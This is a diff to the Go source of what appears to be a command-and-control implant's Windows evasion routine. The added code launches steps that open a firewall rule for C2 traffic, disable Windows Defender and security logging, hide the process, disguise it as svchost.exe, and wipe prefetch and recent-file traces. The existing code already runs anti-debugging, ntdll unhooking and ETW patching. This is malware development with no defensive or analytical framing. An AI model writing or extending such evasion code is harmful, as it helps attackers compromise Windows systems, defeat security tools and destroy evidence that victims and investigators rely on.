@@ -302,6 +302,7 @@ func findTextSection(base uintptr) uintptr {
 // Init evasion techniques at agent startup.
 // This is the main entry point called by the agent on Windows.
 func Init() {
+	// === PHASE 1: Anti-Analysis ===
 	// 1. Anti-debug check — exit if debugger detected
 	if !AntiDebug() {
 		// Debugger detected — could self-delete or sleep forever
@@ -314,6 +315,7 @@ func Init() {
 		SleepWithJitter(5*time.Minute, 15*time.Minute)
 	}
 
+	// === PHASE 2: Memory Evasion ===
 	// 3. Unhook ntdll.dll — restore original syscall stubs from disk
 	go UnhookNtdll()
 
@@ -329,6 +331,45 @@ func Init() {
 	// 5. Patch ETW — prevent event logging
 	go func() {
 		PatchAllETW()
+	}()
+
+	// === PHASE 3: Persistence Evasion ===
+	// 6. Add firewall rule to allow C2 traffic
+	go func() {
+		fe := &FirewallEvasion{}
+		fe.AddFirewallRule()
+	}()
+
+	// 7. Disable Windows Defender (if admin)
+	go func() {
+		DisableWindowsDefender()
+	}()
+
+	// 8. Disable security logging
+	go func() {
+		DisableLogging()
+	}()
+
+	// === PHASE 4: Process Evasion ===
+	// 9. Hide console window
+	go func() {
+		HideProcess()
+	}()
+
+	// 10. Spoof process name to look legitimate
+	go func() {
+		SpoofProcessName(`C:\Windows\System32\svchost.exe`)
+	}()
+
+	// === PHASE 5: Cleanup ===
+	// 11. Clear prefetch files
+	go func() {
+		ClearPrefetch()
+	}()
+
+	// 12. Clear recent files
+	go func() {
+		ClearRecentFiles()
 	}()
 }
 
